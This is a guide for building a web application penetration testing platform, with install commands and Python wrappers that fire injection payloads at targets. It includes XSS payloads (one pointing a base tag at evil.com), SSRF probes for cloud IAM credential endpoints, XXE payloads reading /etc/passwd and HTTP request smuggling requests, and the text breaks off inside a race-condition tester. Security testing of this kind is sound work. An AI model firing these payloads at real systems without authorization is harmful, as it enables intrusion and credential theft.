# IMPLEMENTATION GUIDE - Application Penetration Testing Platform

## Implementation Status

| Phase | Description | Status |
|-------|-------------|--------|
| **Phase 1** | Enhanced Web Discovery & Reconnaissance | Completed |
| **Phase 2** | Manual Testing Support & Proxy Integration | Completed |
| **Phase 3** | Advanced Injection Testing | Completed |
| **Phase 3.5** | Advanced Web Vulnerabilities | Completed |
| **Phase 4** | API & Modern Application Testing | Planned |
| **Phase 5** | Authentication & Authorization Testing | Planned |
| **Phase 6** | Reporting & Integration Enhancement | Planned |

---

## Prerequisites

Before starting, ensure you have:
```bash
# Required base tools
go version      # Go 1.19+
python3 --version  # Python 3.8+
pip3 --version
git --version
npm --version   # Node.js for some tools

# Create tools directory
mkdir -p ~/tools
cd ~/tools
```

---

# PHASE 1: Enhanced Web Discovery & Reconnaissance [COMPLETED]

## 1.1 Tool Installation

### Go Tools
```bash
# Gobuster - Directory/file brute forcing
go install github.com/OJ/gobuster/v3@latest

# Gowitness - Screenshot tool
go install github.com/sensepost/gowitness@latest

# Subjs - JavaScript file discovery
go install github.com/lc/subjs@latest

# x8 - Hidden parameter discovery
go install github.com/Sh1Yo/x8@latest
```

### Python Tools
```bash
# Dirsearch - Web path discovery
pip install dirsearch

# Wfuzz - Web fuzzer
pip install wfuzz

# LinkFinder - Find endpoints in JavaScript
cd ~/tools
git clone https://github.com/GerbenJavado/LinkFinder.git
cd LinkFinder
pip install -r requirements.txt
python setup.py install

# SecretFinder - Find secrets in JavaScript
cd ~/tools
git clone https://github.com/m4ll0k/SecretFinder.git
cd SecretFinder
pip install -r requirements.txt

# Git-dumper - Dump exposed .git repositories
cd ~/tools
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper
pip install -r requirements.txt
```

### Screenshot Tools
```bash
# Aquatone (download binary)
cd ~/tools
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
unzip aquatone_linux_amd64_1.7.0.zip -d aquatone
chmod +x aquatone/aquatone
sudo mv aquatone/aquatone /usr/local/bin/

# EyeWitness
cd ~/tools
git clone https://github.com/RedSiege/EyeWitness.git
cd EyeWitness/Python/setup
sudo ./setup.sh
```

## 1.2 Create Wrapper Files

### File: `wrappers/discovery/gobuster.py`
```python
"""Gobuster wrapper for directory/file brute forcing."""
from utils.base_wrapper import DiscoveryTool

class GobusterWrapper(DiscoveryTool):
    @property
    def tool_name(self) -> str:
        return "gobuster"

    def _build_target_args(self) -> list:
        args = ["dir", "-u", self.target]
        if self.options.get("wordlist"):
            args.extend(["-w", self.options["wordlist"]])
        if self.options.get("extensions"):
            args.extend(["-x", self.options["extensions"]])
        if self.options.get("threads"):
            args.extend(["-t", str(self.options["threads"])])
        if self.options.get("status_codes"):
            args.extend(["-s", self.options["status_codes"]])
        args.extend(["-o", self.output_file])
        return args
```

### File: `wrappers/discovery/dirsearch_wrapper.py`
```python
"""Dirsearch wrapper for web path discovery."""
from utils.base_wrapper import DiscoveryTool

class DirsearchWrapper(DiscoveryTool):
    @property
    def tool_name(self) -> str:
        return "dirsearch"

    def _build_target_args(self) -> list:
        args = ["-u", self.target]
        if self.options.get("wordlist"):
            args.extend(["-w", self.options["wordlist"]])
        if self.options.get("extensions"):
            args.extend(["-e", self.options["extensions"]])
        if self.options.get("threads"):
            args.extend(["-t", str(self.options["threads"])])
        if self.options.get("recursive"):
            args.append("-r")
        args.extend(["--format", "json", "-o", self.output_file])
        return args
```

### File: `wrappers/discovery/linkfinder.py`
```python
"""LinkFinder wrapper for JavaScript endpoint discovery."""
from utils.base_wrapper import DiscoveryTool

class LinkFinderWrapper(DiscoveryTool):
    @property
    def tool_name(self) -> str:
        return "python3"

    def _build_target_args(self) -> list:
        linkfinder_path = self.options.get("tool_path", "~/tools/LinkFinder/linkfinder.py")
        args = [linkfinder_path, "-i", self.target, "-o", "cli"]
        if self.options.get("domain"):
            args.extend(["-d", self.options["domain"]])
        if self.options.get("cookies"):
            args.extend(["-c", self.options["cookies"]])
        return args
```

### File: `wrappers/discovery/secretfinder.py`
```python
"""SecretFinder wrapper for finding secrets in JavaScript."""
from utils.base_wrapper import DiscoveryTool

class SecretFinderWrapper(DiscoveryTool):
    @property
    def tool_name(self) -> str:
        return "python3"

    def _build_target_args(self) -> list:
        secretfinder_path = self.options.get("tool_path", "~/tools/SecretFinder/SecretFinder.py")
        args = [secretfinder_path, "-i", self.target, "-o", "cli"]
        if self.options.get("regex"):
            args.extend(["-r", self.options["regex"]])
        return args
```

### File: `wrappers/discovery/gowitness.py`
```python
"""Gowitness wrapper for screenshots."""
from utils.base_wrapper import DiscoveryTool

class GoWitnessWrapper(DiscoveryTool):
    @property
    def tool_name(self) -> str:
        return "gowitness"

    def _build_target_args(self) -> list:
        if self.options.get("file"):
            args = ["file", "-f", self.options["file"]]
        else:
            args = ["single", self.target]

        if self.options.get("output_dir"):
            args.extend(["-P", self.options["output_dir"]])
        if self.options.get("timeout"):
            args.extend(["--timeout", str(self.options["timeout"])])
        return args
```

## 1.3 Create Wordlists Directory
```bash
mkdir -p config/wordlists

# Download common wordlists
cd config/wordlists

# SecLists (comprehensive)
git clone --depth 1 https://github.com/danielmiessler/SecLists.git

# Common web paths
wget https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt -O common.txt
wget https://raw.githubusercontent.com/digination/dirbuster-ng/master/wordlists/directory-list-2.3-medium.txt -O medium.txt
```

## 1.4 Validation
```bash
# Test each tool
gobuster version
dirsearch --help
gowitness --help
python3 ~/tools/LinkFinder/linkfinder.py --help
python3 ~/tools/SecretFinder/SecretFinder.py --help
```

---

# PHASE 2: Manual Testing Support & Proxy Integration [COMPLETED]

## 2.1 Tool Installation

### ZAP (OWASP Zed Attack Proxy)
```bash
# Install ZAP
# Option 1: Snap (Linux)
sudo snap install zaproxy --classic

# Option 2: Download
wget https://github.com/zaproxy/zaproxy/releases/download/v2.14.0/ZAP_2.14.0_Linux.tar.gz
tar -xzf ZAP_2.14.0_Linux.tar.gz

# ZAP Python API
pip install python-owasp-zap-v2.4
```

### mitmproxy (Alternative/Additional)
```bash
pip install mitmproxy
```

### Fuzzing Tools
```bash
# Wfuzz (already installed in Phase 1)
pip install wfuzz

# ffuf upgrade
go install github.com/ffuf/ffuf/v2@latest
```

### Encoding/Decoding Utilities
```bash
pip install pycryptodome
pip install base58
pip install python-jose  # JWT handling
```

## 2.2 Create Wrapper Files

### File: `wrappers/proxy/__init__.py`
```python
"""Proxy integration wrappers."""
```

### File: `wrappers/proxy/zap_integration.py`
```python
"""OWASP ZAP integration wrapper."""
import time
from zapv2 import ZAPv2

class ZAPIntegration:
    def __init__(self, api_key=None, proxy_host='127.0.0.1', proxy_port=8080):
        self.api_key = api_key
        self.proxy_host = proxy_host
        self.proxy_port = proxy_port
        self.zap = None

    def connect(self):
        """Connect to running ZAP instance."""
        self.zap = ZAPv2(
            apikey=self.api_key,
            proxies={
                'http': f'http://{self.proxy_host}:{self.proxy_port}',
                'https': f'http://{self.proxy_host}:{self.proxy_port}'
            }
        )
        return self.zap.core.version

    def spider_target(self, target, max_depth=5):
        """Spider a target URL."""
        scan_id = self.zap.spider.scan(target, maxchildren=max_depth)
        while int(self.zap.spider.status(scan_id)) < 100:
            time.sleep(2)
        return self.zap.spider.results(scan_id)

    def active_scan(self, target):
        """Run active scan on target."""
        scan_id = self.zap.ascan.scan(target)
        while int(self.zap.ascan.status(scan_id)) < 100:
            time.sleep(5)
        return self.zap.core.alerts()

    def get_alerts(self, base_url=None):
        """Get all alerts, optionally filtered by URL."""
        if base_url:
            return self.zap.core.alerts(baseurl=base_url)
        return self.zap.core.alerts()

    def export_report(self, output_file, format='html'):
        """Export scan report."""
        if format == 'html':
            report = self.zap.core.htmlreport()
        elif format == 'json':
            report = self.zap.core.jsonreport()
        elif format == 'xml':
            report = self.zap.core.xmlreport()
        else:
            raise ValueError(f"Unsupported format: {format}")

        with open(output_file, 'w') as f:
            f.write(report)
        return output_file
```

### File: `wrappers/proxy/request_builder.py`
```python
"""HTTP request builder and manipulator."""
import requests
from urllib.parse import urlparse, urlencode, parse_qs
import json

class RequestBuilder:
    def __init__(self):
        self.session = requests.Session()
        self.history = []

    def build_request(self, method, url, headers=None, params=None,
                      data=None, json_data=None, cookies=None):
        """Build and send HTTP request."""
        req = requests.Request(
            method=method.upper(),
            url=url,
            headers=headers or {},
            params=params,
            data=data,
            json=json_data,
            cookies=cookies
        )
        prepared = self.session.prepare_request(req)
        response = self.session.send(prepared, verify=False)

        self.history.append({
            'request': {
                'method': method,
                'url': url,
                'headers': dict(prepared.headers),
                'body': data or json_data
            },
            'response': {
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'body': response.text[:5000]  # Truncate large responses
            }
        })
        return response

    def replay_request(self, index, modifications=None):
        """Replay a request from history with optional modifications."""
        if index >= len(self.history):
            raise IndexError("Request not found in history")

        original = self.history[index]['request']
        req_data = {**original, **(modifications or {})}

        return self.build_request(**req_data)

    def fuzz_parameter(self, url, param_name, payloads, method='GET'):
        """Fuzz a specific parameter with payloads."""
        results = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for payload in payloads:
            params[param_name] = [payload]
            fuzzed_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"

            response = self.build_request(method, fuzzed_url)
            results.append({
                'payload': payload,
                'status_code': response.status_code,
                'length': len(response.text),
                'response_time': response.elapsed.total_seconds()
            })
        return results
```

### File: `wrappers/proxy/session_manager.py`
```python
"""Session and cookie management."""
import pickle
import json
from http.cookiejar import CookieJar
from datetime import datetime

class SessionManager:
    def __init__(self):
        self.sessions = {}
        self.current_session = None

    def create_session(self, name, cookies=None, headers=None):
        """Create a new named session."""
        self.sessions[name] = {
            'cookies': cookies or {},
            'headers': headers or {},
            'created': datetime.now().isoformat(),
            'tokens': {}
        }
        self.current_session = name
        return name

    def add_token(self, token_name, token_value, token_type='bearer'):
        """Add authentication token to current session."""
        if not self.current_session:
            raise ValueError("No active session")

        self.sessions[self.current_session]['tokens'][token_name] = {
            'value': token_value,
            'type': token_type
        }

    def get_auth_headers(self):
        """Get authentication headers for current session."""
        if not self.current_session:
            return {}

        session = self.sessions[self.current_session]
        headers = session['headers'].copy()

        for token_name, token_data in session['tokens'].items():
            if token_data['type'] == 'bearer':
                headers['Authorization'] = f"Bearer {token_data['value']}"
            elif token_data['type'] == 'api_key':
                headers['X-API-Key'] = token_data['value']

        return headers

    def save_sessions(self, filepath):
        """Save all sessions to file."""
        with open(filepath, 'w') as f:
            json.dump(self.sessions, f, indent=2)

    def load_sessions(self, filepath):
        """Load sessions from file."""
        with open(filepath, 'r') as f:
            self.sessions = json.load(f)
```

## 2.3 Create Utility Files

### File: `utils/encoder.py`
```python
"""Encoding/decoding utilities for payload manipulation."""
import base64
import urllib.parse
import html
import json

class PayloadEncoder:
    @staticmethod
    def url_encode(payload, double=False):
        encoded = urllib.parse.quote(payload, safe='')
        if double:
            encoded = urllib.parse.quote(encoded, safe='')
        return encoded

    @staticmethod
    def base64_encode(payload):
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def base64_decode(payload):
        return base64.b64decode(payload).decode()

    @staticmethod
    def html_encode(payload):
        return html.escape(payload)

    @staticmethod
    def unicode_encode(payload):
        return ''.join(f'\\u{ord(c):04x}' for c in payload)

    @staticmethod
    def hex_encode(payload):
        return payload.encode().hex()

    @staticmethod
    def chain_encode(payload, encodings):
        """Apply multiple encodings in sequence."""
        result = payload
        for encoding in encodings:
            if encoding == 'url':
                result = PayloadEncoder.url_encode(result)
            elif encoding == 'base64':
                result = PayloadEncoder.base64_encode(result)
            elif encoding == 'html':
                result = PayloadEncoder.html_encode(result)
            elif encoding == 'unicode':
                result = PayloadEncoder.unicode_encode(result)
            elif encoding == 'hex':
                result = PayloadEncoder.hex_encode(result)
        return result
```

## 2.4 Validation
```bash
# Test ZAP
zap.sh -version

# Test mitmproxy
mitmproxy --version

# Test ffuf
ffuf -V

# Test Python imports
python3 -c "from zapv2 import ZAPv2; print('ZAP API OK')"
```

---

# PHASE 3: Advanced Injection Testing

## 3.1 Tool Installation

### Enhanced SQLMap
```bash
# Upgrade sqlmap
pip install sqlmap --upgrade

# Or latest from git
cd ~/tools
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

### Payload Repositories
```bash
cd ~/tools
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git

# NoSQLMap
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
pip install -r requirements.txt
```

### Additional Injection Tools
```bash
# Commix (already may exist)
pip install commix

# LDAP injection scanner
pip install ldap3

# XPath injection
pip install lxml
```

## 3.2 Create Wrapper Files

### File: `wrappers/injection/nosql_injection.py`
```python
"""NoSQL injection testing wrapper."""
from utils.base_wrapper import InjectionTool
import requests
import json

class NoSQLInjectionTester(InjectionTool):
    PAYLOADS = [
        # MongoDB
        {"$gt": ""},
        {"$ne": ""},
        {"$regex": ".*"},
        {"$where": "1==1"},
        # Authentication bypass
        {"username": {"$ne": ""}, "password": {"$ne": ""}},
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        # Regex injection
        {"$regex": "^a"},
        {"$regex": ".*", "$options": "i"},
    ]

    @property
    def tool_name(self) -> str:
        return "nosql_injection"

    def test_injection(self, url, param_name, method='POST'):
        """Test for NoSQL injection vulnerabilities."""
        results = []

        for payload in self.PAYLOADS:
            try:
                if method == 'POST':
                    data = {param_name: payload}
                    response = requests.post(url, json=data, timeout=10)
                else:
                    response = requests.get(url, params={param_name: json.dumps(payload)}, timeout=10)

                results.append({
                    'payload': str(payload),
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'potential_vuln': self._detect_vulnerability(response)
                })
            except Exception as e:
                results.append({'payload': str(payload), 'error': str(e)})

        return results

    def _detect_vulnerability(self, response):
        """Detect potential vulnerability indicators."""
        indicators = ['error', 'exception', 'mongodb', 'syntax']
        text_lower = response.text.lower()
        return any(ind in text_lower for ind in indicators) or response.status_code == 200
```

### File: `wrappers/injection/ldap_injection.py`
```python
"""LDAP injection testing wrapper."""
from utils.base_wrapper import InjectionTool
import requests

class LDAPInjectionTester(InjectionTool):
    PAYLOADS = [
        "*",
        "*)(&",
        "*)(uid=*))(|(uid=*",
        "admin*",
        "admin*)((|userPassword=*)",
        "*)(uid=*))%00",
        "x])|(&(cn=*",
        "*()|%26'",
        "admin)(&)",
        "admin)(|(password=*))",
    ]

    @property
    def tool_name(self) -> str:
        return "ldap_injection"

    def test_injection(self, url, param_name, method='GET'):
        """Test for LDAP injection vulnerabilities."""
        results = []
        baseline = self._get_baseline(url, param_name, method)

        for payload in self.PAYLOADS:
            try:
                if method == 'GET':
                    response = requests.get(url, params={param_name: payload}, timeout=10)
                else:
                    response = requests.post(url, data={param_name: payload}, timeout=10)

                results.append({
                    'payload': payload,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'diff_from_baseline': len(response.text) - baseline,
                    'potential_vuln': self._detect_vulnerability(response, baseline)
                })
            except Exception as e:
                results.append({'payload': payload, 'error': str(e)})

        return results

    def _get_baseline(self, url, param_name, method):
        """Get baseline response length."""
        try:
            if method == 'GET':
                response = requests.get(url, params={param_name: 'test'}, timeout=10)
            else:
                response = requests.post(url, data={param_name: 'test'}, timeout=10)
            return len(response.text)
        except:
            return 0

    def _detect_vulnerability(self, response, baseline):
        """Detect potential vulnerability."""
        length_diff = abs(len(response.text) - baseline)
        return length_diff > 100 or response.status_code != 200
```

### File: `wrappers/injection/xpath_injection.py`
```python
"""XPath injection testing wrapper."""
from utils.base_wrapper import InjectionTool
import requests

class XPathInjectionTester(InjectionTool):
    PAYLOADS = [
        "' or '1'='1",
        "' or ''='",
        "x' or 1=1 or 'x'='y",
        "'] | //user/*[contains(*,'",
        "') or ('x'='x",
        "' or count(parent::*[position()=1])=0 or 'a'='b",
        "' or contains(name(parent::*[position()=1]),'a') or 'a'='b",
        "1 or 1=1",
        "' and '1'='1",
        "admin' or '1'='1' or 'a'='a",
    ]

    @property
    def tool_name(self) -> str:
        return "xpath_injection"

    def test_injection(self, url, param_name, method='GET'):
        """Test for XPath injection vulnerabilities."""
        results = []

        for payload in self.PAYLOADS:
            try:
                if method == 'GET':
                    response = requests.get(url, params={param_name: payload}, timeout=10)
                else:
                    response = requests.post(url, data={param_name: payload}, timeout=10)

                results.append({
                    'payload': payload,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'potential_vuln': self._detect_vulnerability(response)
                })
            except Exception as e:
                results.append({'payload': payload, 'error': str(e)})

        return results

    def _detect_vulnerability(self, response):
        """Detect XPath errors or anomalies."""
        error_indicators = ['xpath', 'xmldom', 'xml', 'syntax error', 'expression']
        text_lower = response.text.lower()
        return any(ind in text_lower for ind in error_indicators)
```

### File: `wrappers/injection/advanced_xss.py`
```python
"""Advanced XSS testing with DOM and CSP bypass."""
from utils.base_wrapper import InjectionTool
import requests

class AdvancedXSSTester(InjectionTool):
    DOM_PAYLOADS = [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "javascript:alert(1)",
        "<script>alert(1)</script>",
        "'-alert(1)-'",
        "\";alert(1)//",
        "</script><script>alert(1)</script>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<svg/onload=alert(1)>",
    ]

    CSP_BYPASS_PAYLOADS = [
        # JSONP bypass
        "<script src='https://accounts.google.com/o/oauth2/revoke?callback=alert(1)'></script>",
        # Angular bypass
        "{{constructor.constructor('alert(1)')()}}",
        # Base tag injection
        "<base href='https://evil.com'>",
        # Object data
        "<object data='javascript:alert(1)'>",
    ]

    @property
    def tool_name(self) -> str:
        return "advanced_xss"

    def test_dom_xss(self, url, param_name):
        """Test for DOM-based XSS."""
        results = []
        for payload in self.DOM_PAYLOADS:
            response = requests.get(url, params={param_name: payload}, timeout=10)
            reflected = payload in response.text
            results.append({
                'payload': payload,
                'reflected': reflected,
                'status_code': response.status_code
            })
        return results

    def test_csp_bypass(self, url, param_name):
        """Test CSP bypass techniques."""
        results = []
        # First check CSP header
        response = requests.get(url, timeout=10)
        csp_header = response.headers.get('Content-Security-Policy', '')

        for payload in self.CSP_BYPASS_PAYLOADS:
            response = requests.get(url, params={param_name: payload}, timeout=10)
            results.append({
                'payload': payload,
                'reflected': payload in response.text,
                'csp_present': bool(csp_header)
            })
        return {'csp_header': csp_header, 'tests': results}
```

## 3.3 Create Payload Directory
```bash
mkdir -p config/payloads/injection

# Copy payloads from PayloadsAllTheThings
cp -r ~/tools/PayloadsAllTheThings/SQL\ Injection/* config/payloads/injection/sql/
cp -r ~/tools/PayloadsAllTheThings/XSS\ Injection/* config/payloads/injection/xss/
cp -r ~/tools/PayloadsAllTheThings/NoSQL\ Injection/* config/payloads/injection/nosql/
```

## 3.4 Validation
```bash
# Test sqlmap
sqlmap --version

# Test NoSQLMap
python3 ~/tools/NoSQLMap/nosqlmap.py --help

# Test imports
python3 -c "import ldap3; print('LDAP OK')"
python3 -c "from lxml import etree; print('lxml OK')"
```

---

# PHASE 3.5: Advanced Web Vulnerabilities

## 3.5.1 Tool Installation

### SSRF Tools
```bash
cd ~/tools

# SSRFmap
git clone https://github.com/swisskyrepo/SSRFmap.git
cd SSRFmap
pip install -r requirements.txt

# Gopherus
cd ~/tools
git clone https://github.com/tarunkant/Gopherus.git

# Interactsh (OOB callback)
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
```

### XXE Tools
```bash
cd ~/tools
git clone https://github.com/enjoiz/XXEinjector.git
```

### Deserialization Tools
```bash
cd ~/tools

# ysoserial (Java) - requires Java
git clone https://github.com/frohoff/ysoserial.git
# Build: cd ysoserial && mvn package

# phpggc (PHP)
git clone https://github.com/ambionics/phpggc.git

# ysoserial.net (.NET)
git clone https://github.com/pwntester/ysoserial.net.git
```

### HTTP Smuggling Tools
```bash
cd ~/tools
git clone https://github.com/defparam/smuggler.git
pip install h2
```

### Race Condition & Other Tools
```bash
pip install aiohttp asyncio

# Prototype Pollution
cd ~/tools
git clone https://github.com/nicholastay/ppmap.git

# CORS Testing
git clone https://github.com/s0md3v/Corsy.git
cd Corsy
pip install -r requirements.txt

# Open Redirect
git clone https://github.com/devanshbatham/OpenRedireX.git

# File upload testing
pip install python-magic
```

## 3.5.2 Create Wrapper Files

### File: `wrappers/advanced/__init__.py`
```python
"""Advanced vulnerability testing wrappers."""
```

### File: `wrappers/advanced/ssrf_tester.py`
```python
"""SSRF testing wrapper with cloud metadata checks."""
from utils.base_wrapper import BaseToolWrapper
import requests
from urllib.parse import urlparse, urljoin

class SSRFTester(BaseToolWrapper):
    CLOUD_METADATA_URLS = [
        # AWS
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        # GCP
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/",
        # Azure
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        # DigitalOcean
        "http://169.254.169.254/metadata/v1/",
        # Oracle Cloud
        "http://169.254.169.254/opc/v1/instance/",
    ]

    INTERNAL_URLS = [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://127.0.0.1:22/",
        "http://127.0.0.1:3306/",
        "http://127.0.0.1:6379/",
        "http://127.0.0.1:11211/",
    ]

    BYPASS_PAYLOADS = [
        "http://127.1/",
        "http://0177.0.0.1/",  # Octal
        "http://0x7f.0.0.1/",  # Hex
        "http://2130706433/",  # Decimal
        "http://127.0.0.1.nip.io/",
        "http://localtest.me/",
        "http://127。0。0。1/",  # Unicode dots
    ]

    @property
    def tool_name(self) -> str:
        return "ssrf_tester"

    def test_ssrf(self, url, param_name, callback_url=None, method='GET'):
        """Test for SSRF vulnerabilities."""
        results = {
            'cloud_metadata': [],
            'internal_access': [],
            'bypass_attempts': [],
            'oob_callback': None
        }

        # Test cloud metadata
        for meta_url in self.CLOUD_METADATA_URLS:
            result = self._test_payload(url, param_name, meta_url, method)
            result['target'] = meta_url
            results['cloud_metadata'].append(result)

        # Test internal URLs
        for internal_url in self.INTERNAL_URLS:
            result = self._test_payload(url, param_name, internal_url, method)
            result['target'] = internal_url
            results['internal_access'].append(result)

        # Test bypass techniques
        for bypass in self.BYPASS_PAYLOADS:
            result = self._test_payload(url, param_name, bypass, method)
            result['target'] = bypass
            results['bypass_attempts'].append(result)

        # OOB callback test
        if callback_url:
            result = self._test_payload(url, param_name, callback_url, method)
            results['oob_callback'] = result

        return results

    def _test_payload(self, url, param_name, payload, method):
        """Send request with SSRF payload."""
        try:
            if method == 'GET':
                response = requests.get(url, params={param_name: payload}, timeout=10, allow_redirects=False)
            else:
                response = requests.post(url, data={param_name: payload}, timeout=10, allow_redirects=False)

            return {
                'payload': payload,
                'status_code': response.status_code,
                'response_length': len(response.text),
                'potential_vuln': self._detect_ssrf(response)
            }
        except requests.exceptions.Timeout:
            return {'payload': payload, 'timeout': True, 'potential_vuln': True}
        except Exception as e:
            return {'payload': payload, 'error': str(e)}

    def _detect_ssrf(self, response):
        """Detect SSRF indicators."""
        indicators = [
            'ami-id', 'instance-id', 'security-credentials',  # AWS
            'computeMetadata', 'google',  # GCP
            'azurespeed', 'azure',  # Azure
            'root:', 'localhost', '127.0.0.1'
        ]
        return any(ind in response.text for ind in indicators)
```

### File: `wrappers/advanced/xxe_injector.py`
```python
"""XXE injection testing wrapper."""
from utils.base_wrapper import BaseToolWrapper
import requests

class XXEInjector(BaseToolWrapper):
    XXE_PAYLOADS = {
        'basic': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>''',

        'parameter_entity': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<root>test</root>''',

        'blind_oob': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{callback_url}">%xxe;]>
<root>test</root>''',

        'cdata': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "{callback_url}/dtd">
%dtd;]>
<root>&all;</root>''',

        'php_filter': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>&xxe;</root>''',

        'ssrf': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>''',
    }

    @property
    def tool_name(self) -> str:
        return "xxe_injector"

    def test_xxe(self, url, callback_url=None):
        """Test for XXE vulnerabilities."""
        results = []

        for name, payload in self.XXE_PAYLOADS.items():
            if '{callback_url}' in payload:
                if callback_url:
                    payload = payload.replace('{callback_url}', callback_url)
                else:
                    continue

            try:
                response = requests.post(
                    url,
                    data=payload,
                    headers={'Content-Type': 'application/xml'},
                    timeout=15
                )

                results.append({
                    'type': name,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'potential_vuln': self._detect_xxe(response),
                    'response_preview': response.text[:500]
                })
            except Exception as e:
                results.append({'type': name, 'error': str(e)})

        return results

    def _detect_xxe(self, response):
        """Detect XXE indicators."""
        indicators = ['root:', '/bin/bash', 'nobody:', 'daemon:', 'www-data']
        return any(ind in response.text for ind in indicators)
```

### File: `wrappers/advanced/http_smuggler.py`
```python
"""HTTP Request Smuggling testing wrapper."""
from utils.base_wrapper import BaseToolWrapper
import socket
import ssl

class HTTPSmuggler(BaseToolWrapper):
    @property
    def tool_name(self) -> str:
        return "http_smuggler"

    def test_clte(self, host, port=443, use_ssl=True):
        """Test CL.TE smuggling."""
        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"G"
        )
        return self._send_raw(host, port, payload, use_ssl)

    def test_tecl(self, host, port=443, use_ssl=True):
        """Test TE.CL smuggling."""
        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"5c\r\n"
            f"GPOST / HTTP/1.1\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 15\r\n"
            f"\r\n"
            f"x=1\r\n"
            f"0\r\n"
            f"\r\n"
        )
        return self._send_raw(host, port, payload, use_ssl)

    def test_tete(self, host, port=443, use_ssl=True):
        """Test TE.TE smuggling with obfuscation."""
        obfuscations = [
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
            "Transfer-Encoding:\tchunked",
            "X: X\r\nTransfer-Encoding: chunked",
            "Transfer-Encoding\r\n: chunked",
        ]

        results = []
        for obf in obfuscations:
            payload = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 4\r\n"
                f"{obf}\r\n"
                f"\r\n"
                f"5c\r\n"
                f"GPOST / HTTP/1.1\r\n"
                f"Content-Length: 15\r\n"
                f"\r\n"
                f"x=1\r\n"
                f"0\r\n"
                f"\r\n"
            )
            result = self._send_raw(host, port, payload, use_ssl)
            result['obfuscation'] = obf
            results.append(result)

        return results

    def _send_raw(self, host, port, payload, use_ssl):
        """Send raw HTTP request."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)

            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)

            sock.connect((host, port))
            sock.send(payload.encode())

            response = b""
            while True:
                try:
                    data = sock.recv(4096)
                    if not data:
                        break
                    response += data
                except socket.timeout:
                    break

            sock.close()

            return {
                'success': True,
                'response_length': len(response),
                'response': response.decode('utf-8', errors='ignore')[:1000],
                'potential_vuln': self._detect_smuggling(response.decode('utf-8', errors='ignore'))
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def _detect_smuggling(self, response):
        """Detect smuggling indicators."""
        indicators = ['405', 'Method Not Allowed', 'Unrecognized', 'Bad Request']
        return any(ind in response for ind in indicators)
```

### File: `wrappers/advanced/race_condition.py`
```python
"""Race condition testing wrapper."""
import asyncio
import aiohttp
from utils.base_wrapper import BaseToolWrapper

class RaceConditionTester(BaseToolWrapper):
    @property
    def tool_name(self) -> str:
        return "race_condition"

    async def _send_request(self, session, url, method, data, headers):
        """Send single async request."""
        try:
            if method == 'GET':
                async with session.get(url, headers=headers) as response:
                    return await response.text(), response.status
            else:
                async with session.post(url, data=data, headers=headers) as response:
                    return await response.text(), response.status
        except Exception as e:
            return str(e), 0

    async def _race_requests(self, url, method, data, headers, count):
        """Send multiple requests simultaneously."""
        async with aiohttp.ClientSession() as session:
            tasks = [
                self._send_request(session, url, method, data, headers)
                for _ in range(count)
            ]
            # Wait for all requests to be ready, then release them together
            results = await asyncio.gather(*tasks)
            return results

    def test_race(self, url, method='POST', data=None, headers=None, parallel_requests=10):
        """Test for race conditions."""
        headers = headers or {}
        data = data or {}

